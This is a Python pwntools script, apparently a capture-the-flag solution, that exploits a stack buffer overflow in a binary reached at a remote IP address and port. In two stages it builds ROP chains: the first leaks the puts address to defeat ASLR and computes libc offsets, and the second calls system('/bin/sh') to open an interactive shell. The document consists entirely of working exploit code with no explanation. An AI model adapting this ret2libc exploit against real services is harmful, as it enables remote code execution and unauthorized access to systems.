from pwn import *
context.arch = 'amd64'

r = remote('136.115.87.65', 31782)
e = ELF('../files/main')
r.recvuntil(b"out?\n")

pop_rdi = 0x4011d6
ret = 0x40101a
puts_plt = e.plt['puts']
puts_got = e.got['puts']

# Stage 1: Leak libc
payload = b"A" * 0x30
payload += p64(0x4040a0) # safe BSS address for rbp
payload += p64(pop_rdi)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(0x4011dc) # endbr64 before main

r.sendline(payload)
r.recvuntil(b"Invalid book\n")
leak = r.recv(6)
puts_addr = u64(leak.ljust(8, b'\x00'))
print("puts:", hex(puts_addr))

# Based on libc6_2.43-2ubuntu2.3_amd64
libc_base = puts_addr - 0x8eae0
system_addr = libc_base + 0x5c560
bin_sh = libc_base + 0x1db799

r.recvuntil(b"out?\n")

# Stage 2: system("/bin/sh")
payload2 = b"A" * 0x30
payload2 += p64(0x4040a0) # new rbp
payload2 += p64(ret) # stack align
payload2 += p64(pop_rdi)
payload2 += p64(bin_sh)
payload2 += p64(system_addr)
r.sendline(payload2)

r.interactive()
